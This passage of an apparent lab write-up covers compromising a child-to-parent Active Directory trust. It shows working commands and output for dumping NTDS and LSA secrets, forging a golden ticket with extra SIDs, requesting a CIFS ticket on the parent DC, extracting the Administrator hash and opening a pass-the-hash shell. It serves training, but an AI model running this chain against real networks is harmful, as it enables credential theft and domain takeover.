SMB         192.168.98.120  445    CDC              [*] Windows 10 / Server 2019 Build 17763 x64 (name:CDC) (domain:child.warfare.corp) (signing:True) (SMBv1:False) 
SMB         192.168.98.30   445    MGMT             [+] child.warfare.corp\corpmngr:User4&*&* 
SMB         192.168.98.2    445    DC01             [-] warfare.corp\corpmngr:User4&*&* STATUS_LOGON_FAILURE 
SMB         192.168.98.120  445    CDC              [+] child.warfare.corp\corpmngr:User4&*&* (../IMAGES/Pwn3d!)
```

![Pasted image 20250919151350.png](../IMAGES/Pasted%20image%2020250919151350.png)

Now we got administrative level permissions on the `192.168.98.120` host, we could try dumping the secrets again and check if we got anything:

```bash
nxc smb 192.168.98.120 -u 'corpmngr' -p 'User4&*&*' --lsa
SMB         192.168.98.120  445    CDC              [*] Windows 10 / Server 2019 Build 17763 x64 (name:CDC) (domain:child.warfare.corp) (signing:True) (SMBv1:False) 
SMB         192.168.98.120  445    CDC              [+] child.warfare.corp\corpmngr:User4&*&* (../IMAGES/Pwn3d!)
SMB         192.168.98.120  445    CDC              [+] Dumping LSA secrets
SMB         192.168.98.120  445    CDC              CHILD\CDC$:aes256-cts-hmac-sha1-96:73ca8d8c00cdbb552663b8ef06d1c02745a1d01ee551b3082e7bd5f4e5240618
SMB         192.168.98.120  445    CDC              CHILD\CDC$:aes128-cts-hmac-sha1-96:c32b293d8c494a0ac5e2eb0c8c47c5ec
SMB         192.168.98.120  445    CDC              CHILD\CDC$:des-cbc-md5:2fd9c2f1493b8557
SMB         192.168.98.120  445    CDC              CHILD\CDC$:plain_password_hex:dec8be4159c40ab7bd30c75d4594dc2228201bd93e131e7646921ccc58d736e14c1a48fe4b6a3e265d458a358300cbd147525e5762677f3c0e349ad6dbe098984abc4b680cad531d478688c28e8717742ca207d5ae3771f3cce351fcffd27d550fff41f6e5baef749e92d975bb2f5412f39129759028aa50add5ea0ae875a0d29bad1a35edf1c76ba0590940d030ba9de148d9300217a0e3c0863182d3c63638ff72a1cdb6629e5a2cda1ba2f845f34a3614f925e3e5988c66be7bc1978058850797a3968e07554619aa22db47746c0c8a2fc34b39afc12cf5b5f56fddba8593fbfebbda08b66cfceb737b61989d93d3
SMB         192.168.98.120  445    CDC              CHILD\CDC$:aad3b435b51404eeaad3b435b51404ee:e1114a4baf09a9f2ba9e6388c5d6c169:::
SMB         192.168.98.120  445    CDC              dpapi_machinekey:0xf9e5cb0452350da239e70d692e67a5cc857a8dfd
dpapi_userkey:0xf349f2325f7dbc9b6817f715c717c000d630d206
```

Nothing here, what can we do then to pivot onto the parent DC, we already got admin level permissions on the child DC right, we could abuse this to forge a golden ticket, if you don't know what a golden ticket is, read the following short explanation:

![Pasted image 20250919151355.png](../IMAGES/Pasted%20image%2020250919151355.png)

Ok, let's perform the golden ticket attack, first of all, let's add both DCs and domains to /etc/hosts:

```bash
echo '192.168.98.2 warfare.corp dc01.warfare.corp' | sudo tee -a /etc/hosts
echo '192.168.98.120 child.warfare.corp cdc.child.warfare.corp' | sudo tee -a /etc/hosts
```

_Note_: You need to have your hosts file exactly as I did on this command, I explain later on the writeup why.

Now that we have everything in order, let's use `nxc` to dump us the NLTM hash of the `krbtgt` account so we can use `ticketer.py` to get the golden ticket:

```bash
nxc smb 192.168.98.120 -u 'corpmngr' -p 'User4&*&*' --ntds
[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] Y
SMB         192.168.98.120  445    CDC              [*] Windows 10 / Server 2019 Build 17763 x64 (name:CDC) (domain:child.warfare.corp) (signing:True) (SMBv1:False) 
SMB         192.168.98.120  445    CDC              [+] child.warfare.corp\corpmngr:User4&*&* (../IMAGES/Pwn3d!)
SMB         192.168.98.120  445    CDC              [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.98.120  445    CDC              Administrator:500:aad3b435b51404eeaad3b435b51404ee:cf80de6600b6cd84f8ac65fb7b7c9188:::
SMB         192.168.98.120  445    CDC              Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.98.120  445    CDC              krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e57dd34c1871b7a23fb17a77dec9b900:::
SMB         192.168.98.120  445    CDC              child.warfare.corp\john:1104:aad3b435b51404eeaad3b435b51404ee:b6f7e9a9a92eaa9ecffb698657dfab36:::
SMB         192.168.98.120  445    CDC              child.warfare.corp\corpmngr:1106:aad3b435b51404eeaad3b435b51404ee:4cb3933610b827a281ec479031128cc6:::
SMB         192.168.98.120  445    CDC              CDC$:1000:aad3b435b51404eeaad3b435b51404ee:e1114a4baf09a9f2ba9e6388c5d6c169:::
SMB         192.168.98.120  445    CDC              MGMT$:1107:aad3b435b51404eeaad3b435b51404ee:0f5fe480dd7eaf1d59a401a4f268b563:::
SMB         192.168.98.120  445    CDC              WARFARE$:1103:aad3b435b51404eeaad3b435b51404ee:b1b77ea3939fdc06cc36e65ba031875d:::
```

We got the hash for the `krbtgt` account:

```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e57dd34c1871b7a23fb17a77dec9b900::: 
```

Even though we got the NLTM hash, we need another type of hash, we need the AES256 hash of the krbtgt account, that's because a patch was introduced on `2023` by Microsoft which changes the validation on the username by resolving to the SID using something called a PAC_REQUESTOR structure, take a look at this article for a deeper understanding:

https://drsuresh.net/articles/kerberos2023

![Pasted image 20250919151403.png](../IMAGES/Pasted%20image%2020250919151403.png)

We can use `secretsdump.py` to get it:

```python
secretsdump.py 'child.warfare.corp/corpmngr:User4&*&*'@192.168.98.120 -just-dc-user CHILD/krbtgt

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e57dd34c1871b7a23fb17a77dec9b900:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2
krbtgt:aes128-cts-hmac-sha1-96:806d6ea798a9626d3ad00516dd6968b5
krbtgt:des-cbc-md5:ba0b49b6b6455885
```

We got our hash, what we need now is the Domain SID from the parent and the child domain, let's use `lookupsid.py` from impacket to get it:

```python
lookupsid.py 'child.warfare.corp/corpmngr:User4&*&*'@192.168.98.2 -domain-sids

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Brute forcing SIDs at 192.168.98.2
[*] StringBinding ncacn_np:192.168.98.2[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-3375883379-808943238-3239386119
498: WARFARE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: WARFARE\Administrator (SidTypeUser)
501: WARFARE\Guest (SidTypeUser)
502: WARFARE\krbtgt (SidTypeUser)
512: WARFARE\Domain Admins (SidTypeGroup)
513: WARFARE\Domain Users (SidTypeGroup)
514: WARFARE\Domain Guests (SidTypeGroup)
515: WARFARE\Domain Computers (SidTypeGroup)
516: WARFARE\Domain Controllers (SidTypeGroup)
517: WARFARE\Cert Publishers (SidTypeAlias)
518: WARFARE\Schema Admins (SidTypeGroup)
519: WARFARE\Enterprise Admins (SidTypeGroup)
520: WARFARE\Group Policy Creator Owners (SidTypeGroup)
521: WARFARE\Read-only Domain Controllers (SidTypeGroup)
522: WARFARE\Cloneable Domain Controllers (SidTypeGroup)
525: WARFARE\Protected Users (SidTypeGroup)
526: WARFARE\Key Admins (SidTypeGroup)
527: WARFARE\Enterprise Key Admins (SidTypeGroup)
553: WARFARE\RAS and IAS Servers (SidTypeAlias)
571: WARFARE\Allowed RODC Password Replication Group (SidTypeAlias)
572: WARFARE\Denied RODC Password Replication Group (SidTypeAlias)
1000: WARFARE\DC01$ (SidTypeUser)
1101: WARFARE\DnsAdmins (SidTypeAlias)
1102: WARFARE\DnsUpdateProxy (SidTypeGroup)
1103: WARFARE\CHILD$ (SidTypeUser)
```

Let's find the child SID:

```python
lookupsid.py 'child.warfare.corp/corpmngr:User4&*&*'@192.168.98.120 -domain-sids

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Brute forcing SIDs at 192.168.98.120
[*] StringBinding ncacn_np:192.168.98.120[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-3754860944-83624914-1883974761
500: CHILD\Administrator (SidTypeUser)
501: CHILD\Guest (SidTypeUser)
502: CHILD\krbtgt (SidTypeUser)
512: CHILD\Domain Admins (SidTypeGroup)
513: CHILD\Domain Users (SidTypeGroup)
514: CHILD\Domain Guests (SidTypeGroup)
515: CHILD\Domain Computers (SidTypeGroup)
516: CHILD\Domain Controllers (SidTypeGroup)
517: CHILD\Cert Publishers (SidTypeAlias)
520: CHILD\Group Policy Creator Owners (SidTypeGroup)
521: CHILD\Read-only Domain Controllers (SidTypeGroup)
522: CHILD\Cloneable Domain Controllers (SidTypeGroup)
525: CHILD\Protected Users (SidTypeGroup)
526: CHILD\Key Admins (SidTypeGroup)
553: CHILD\RAS and IAS Servers (SidTypeAlias)
571: CHILD\Allowed RODC Password Replication Group (SidTypeAlias)
572: CHILD\Denied RODC Password Replication Group (SidTypeAlias)
1000: CHILD\CDC$ (SidTypeUser)
1101: CHILD\DnsAdmins (SidTypeAlias)
1102: CHILD\DnsUpdateProxy (SidTypeGroup)
1103: CHILD\WARFARE$ (SidTypeUser)
1104: CHILD\john (SidTypeUser)
1106: CHILD\corpmngr (SidTypeUser)
1107: CHILD\MGMT$ (SidTypeUser)
```

We got all we need, we got both SIDs, the user SID, our AES256 hash for the krbtgt account, we can now use `ticketer.py`, the technique will exploit the trust relation that exists between the child and parent domains, allowing us to access resources in the parent domain using the forged ticket, we can use the following command to get the golden ticket:

```python
ticketer.py -domain child.warfare.corp -aesKey ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2 -domain-sid S-1-5-21-3754860944-83624914-1883974761 -groups 516 -user-id 1106 -extra-sid S-1-5-21-3375883379-808943238-3239386119-516,S-1-5-9 corpmngr

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for child.warfare.corp/corpmngr
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in corpmngr.ccache
```

Let's do a quick recap of the parameters I used here:

- `-domain child.warfare.corp`: The target domain for the ticket (child domain).
    
- `-aesKey ...`: The AES256 hash of the `krbtgt` account from the child domain.
    
- `-domain-sid ...`: The SID of the child domain.
    
- `-groups 516`: Sets the primary group to "Domain Controllers" (RID 516) in the child domain.
    
- `-user-id 1106`: The RID of the `corpmngr` user in the child domain.
    
- `-extra-sid ...`: Adds extra SIDs from the parent domain:
    
    - `S-1-5-21-3375883379-808943238-3239386119-516`: The SID for the "Domain Controllers" group in the parent domain.
        
    - `S-1-5-9`: The well-known SID for "Enterprise Domain Controllers" (across the forest).
        
- `corpmngr`: The username for which the ticket is forged.

Now we need to export our ticket:

```bash
export KRB5CCNAME=corpmngr.ccache
```

Now we got a TGT as the `corpmngr` user, we can use this TGT to request a TGS on the CIFS service on the parent DC so we can interact with services on the parent domain with administrator privileges, we can use `getST.py` for this:

```python
sudo ntpdate 192.168.98.120

getST.py -k -no-pass -spn cifs/DC01.warfare.corp warfare.corp/Administrator -dc-ip 192.168.98.2
```

On this point, I was facing a big problem related to Kerberos, each time I tried to request the TGS, I got the following error:

```
KDC_ERR_TGT_REVOKED(TGT has been revoked)
```

I investigated a lot on this issue and came across multiple repositories and articles talking about it but none offered a real solution, for example this one:

https://github.com/fortra/impacket/issues/1601

The issue is the way I had the DC and domain on the `/etc/hosts` file, as I generally do HackTheBox AD machines, most of them work with a format of:

```
IP DC Domain
```

In this case, it changes, you need to put it in the format of:

```
IP Domain DC
```

I've corrected this issue on the writeup so this is the explanation on why you could have errors if you didn't map the hosts file correctly, but I think this is great since it teaches me even some minor mistakes can pretty much alter everything you do later on.

After the little talk about the hosts issue, once we use the command, we get the ticket:

![Pasted image 20250919151415.png](../IMAGES/Pasted%20image%2020250919151415.png)

Let's set the Kerberos cache:

```bash
export KRB5CCNAME=corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache
```

**What will we do with this TGS?**

We will use `secretsdump.py` to extract the Administrator's NTLM hash and finish the lab, let's do it:

```python
sudo ntpdate 192.168.98.2

secretsdump.py -k -no-pass -just-dc-use 'WARFARE/Administrator' dc01.warfare.corp -debug

[+] Using Kerberos Cache: corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache
[+] Domain retrieved from CCache: CHILD.WARFARE.CORP
[+] Returning cached credential for CIFS/DC01.WARFARE.CORP@WARFARE.CORP
[+] Using TGS from cache
[+] Changing sname from CIFS/dc01.warfare.corp@WARFARE.CORP to CIFS/DC01.WARFARE.CORP@CHILD.WARFARE.CORP and hoping for the best
[+] Username retrieved from CCache: corpmngr
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[+] Calling DRSCrackNames for WARFARE\Administrator 
[+] Calling DRSGetNCChanges for {17446816-c072-445e-ac9b-c0e28630bed6} 
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Administrator,CN=Users,DC=warfare,DC=corp
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a2f7b77b62cd97161e18be2ffcfdfd60:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Finished processing and printing user's hashes, now printing supplemental information
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:cd371dd3e390291fbf9bb8b846bf5dcf5b165f7b8c0a674209adccc623a1ed91
Administrator:aes128-cts-hmac-sha1-96:4bf8d84543c9d0d333fbee5127ba41b3
Administrator:des-cbc-md5:0e7ccb618f2a5432
[*] Cleaning up..
```

We finally got our NTLM hash from the Administrator on the Parent DC, let's use `evil-winrm` to get a shell and finish the lab:

```
evil-winrm -i 192.168.98.2 -u Administrator -H 'a2f7b77b62cd97161e18be2ffcfdfd60'
```

![Pasted image 20250919151420.png](../IMAGES/Pasted%20image%2020250919151420.png)

![Pasted image 20250919151426.png](../IMAGES/Pasted%20image%2020250919151426.png)

